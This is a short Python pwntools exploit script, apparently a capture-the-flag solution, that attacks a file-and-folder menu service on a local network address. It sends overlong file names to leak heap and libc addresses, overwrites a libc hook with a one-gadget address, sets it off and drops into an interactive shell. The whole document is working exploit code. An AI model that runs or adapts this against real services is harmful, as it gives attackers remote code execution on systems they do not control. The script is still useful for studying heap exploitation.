from pwn import *

s = remote('192.168.0.85',1234)
def make_folder(name):
  s.recvuntil('Your choice:')
  s.send('3\n')
  s.recvuntil('Name of Folder:')
  s.send(name)
def make_file(name,size):
  s.recvuntil('Your choice:')
  s.send('4\n')
  s.recvuntil('Name of File:')
  s.send(name)
  s.recvuntil('Size of File:')
  s.send(str(size)+'\n')
def calc():
  s.recvuntil('Your choice:')
  s.send('6\n')
def remove(name):
  s.recvuntil('Your choice:')
  s.send('5\n')
  s.recvuntil('Choose a Folder or file :')
  s.send(name+'\n')
def list():
  s.recvuntil('Your choice:')
  s.send('1\n')
def change_folder(name):
  s.recvuntil('Your choice:')
  s.send('2\n')
  s.recvuntil('Choose a Folder :')
  s.send(name)
make_file('A'*0x18,0)
calc()
heap = u64(s.recvuntil(':')[-8:-2]+'\x00\x00') - 0x88
log.info('HEAP : 0x%x'%heap)
make_file('A'*0x18+p64(heap+0x10)[:-1],(heap+0xa0-88)&0xffffffff)
make_file('B'*0x18+p64(heap+0x14)[:-1],(heap+0xa0-88)>>32)
make_file('C'*0x18,0)
remove('A'*0x18)
calc()
list()
libc = u64(s.recvuntil('A')[-8:-2]+'\x00\x00') - 0x3c3b78
log.info('LIBC : 0x%x'%libc)
make_folder('Exploit')
change_folder('Exploit')
magic = libc + 0x4526a
#malloc_hook - 0x3c3b10
raw_input()
make_file('A'*0x18+p64(libc+0x3c57a8)[:-1],(magic)&0xffffffff)
make_file('B'*0x18+p64(libc+0x3c57ac)[:-1],(magic)>>32)
calc()
remove('A'*0x18+p64(libc+0x3c57a8)[:-1])
s.interactive()
